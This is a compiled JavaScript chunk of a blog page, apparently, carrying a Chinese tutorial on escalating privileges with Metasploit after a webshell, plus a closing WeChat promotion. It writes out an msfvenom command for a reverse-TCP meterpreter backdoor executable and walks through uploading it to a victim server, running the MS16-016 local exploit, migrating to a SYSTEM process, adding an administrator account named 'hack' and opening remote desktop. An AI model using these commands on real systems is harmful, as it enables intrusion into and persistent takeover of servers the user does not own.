(window.webpackJsonp=window.webpackJsonp||[]).push([[258],{546:function(a,s,t){"use strict";t.r(s);var l=t(7),v=Object(l.a)({},(function(){var a=this,s=a._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[s("h1",{attrs:{id:"msf提权"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#msf提权"}},[a._v("#")]),a._v(" MSF提权")]),a._v(" "),s("p",[a._v("在WEB渗透中当我们拿到webshell了，我们可以试试用MSF(metasploit)来进行提权，在MSF里meterpreter很强大的！")]),a._v(" "),s("p",[a._v("我们先用msfvenom生成一个EXE的木马后门。")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("msfvenom "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" windows/meterpreter/reverse_tcp "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-e")]),a._v(" x86/shikata_ga_nai "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-i")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("5")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-b")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v("'\\x00'")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("LHOST")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("192.168")]),a._v(".1.7 "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("LPORT")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("4444")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-f")]),a._v(" exe "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v(" abc.exe\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190106221604920.jpg",loading:"lazy"}})]),a._v(" "),s("p",[a._v("然后在到MSF根据刚才配置的木马后门进行监听...")]),a._v(" "),s("p",[a._v("然后在把木马上传到服务器（受害者）的机器里，必须上传到可读可写的目录下")]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190106221651573.jpg",loading:"lazy"}})]),a._v(" "),s("p",[a._v("比如这里我吧abc.exe上传到了C:\\users\\leak\\desktop\\目录下，")]),a._v(" "),s("p",[a._v("abc.exe就是我刚才生成的后门。")]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190106221723788.jpg",loading:"lazy"}})]),a._v(" "),s("p",[a._v("然后在执行我们的后门，可以看见MSF弹回了一个session 1(会话连接)。")]),a._v(" "),s("p",[a._v("说明我们后门程序成功执行起来了，当然你也可以在webshell执行的，")]),a._v(" "),s("p",[a._v("但必须的有一点执行的权限")]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/2019010622180692.jpg",loading:"lazy"}})]),a._v(" "),s("p",[a._v("getuid //可以看见我们的权限很低的，一般都是user权限的，")]),a._v(" "),s("p",[a._v("但也遇到过某些服务器执行后就直接是system最高权限。像这种我们就直接加用户啦。")]),a._v(" "),s("p",[a._v("这里我们是user权限，我们要把它提升到system权限。Windows最高权限")]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190106221851139.jpg",loading:"lazy"}})]),a._v(" "),s("p",[a._v("接着我们输入命令")]),a._v(" "),s("p",[a._v("background   //把你当前的metasploit shell转为后台执行。")]),a._v(" "),s("p",[a._v("search ms16  // 搜索关键字相关的漏洞")]),a._v(" "),s("p",[a._v(".....然后我选择了MS16-016这个漏洞在进行提权")]),a._v(" "),s("p",[a._v("use exploit/windows/local/ms16_016_webdav //  选择漏洞")]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190106221937551.jpg",loading:"lazy"}})]),a._v(" "),s("p",[a._v("show options  //查看漏洞里边要设置的参数")]),a._v(" "),s("p",[a._v("可以看见只有一个SESSION参数要设置")]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190106222107730.jpg",loading:"lazy"}})]),a._v(" "),s("p",[a._v("set  SESSION 1 // 设置会刚才我们后门连接的ID号 1")]),a._v(" "),s("p",[a._v("exploit //执行提权...")]),a._v(" "),s("p",[a._v("可以看见成功的吧漏洞利用到了PID为692的进程中...")]),a._v(" "),s("p",[a._v("虽然提权成功了 但你getuid下还是看见的是user权限")]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/2019010622214883.jpg",loading:"lazy"}})]),a._v(" "),s("p",[a._v("ps一下查看进程")]),a._v(" "),s("p",[a._v("根据刚才的提示找到PID 692的进程")]),a._v(" "),s("p",[a._v("可以看见确实是system权限")]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190106222225510.jpg",loading:"lazy"}})]),a._v(" "),s("p",[a._v("所以我们还要用到migrate 命令 //迁移到一个指定的进程ID。")]),a._v(" "),s("p",[a._v("migrate 692  //")]),a._v(" "),s("p",[a._v("在getuid下可以看见为system权限啦")]),a._v(" "),s("p",[a._v("提权成功了")]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190106222259401.jpg",loading:"lazy"}})]),a._v(" "),s("p",[a._v("既然有了system权限 那我们在添加账号hack")]),a._v(" "),s("p",[a._v("添加为管理员组")]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190106222350540.jpg",loading:"lazy"}})]),a._v(" "),s("p",[a._v("用Nmap扫下并没有开启远程登陆3389")]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190106222445235.jpg",loading:"lazy"}})]),a._v(" "),s("p",[a._v("run getgui -e  //开启目标主机3389  貌似这条MSF命令只对2003的系统有效 执行几次都没成功")]),a._v(" "),s("p",[a._v("所以就用cmd命令开了3389端口")]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190106222845638.jpg",loading:"lazy"}})]),a._v(" "),s("p",[a._v("提权成功，登录服务器。。。")]),a._v(" "),s("h2",{attrs:{id:"写在最后"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[a._v("#")]),a._v(" 写在最后")]),a._v(" "),s("blockquote",[s("p",[a._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),s("strong",[a._v("冰河技术")]),a._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),s("strong",[a._v("冰河技术")]),a._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),s("strong",[a._v("冰河技术")]),a._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),s("strong",[a._v("冰河技术")]),a._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);s.default=v.exports}}]);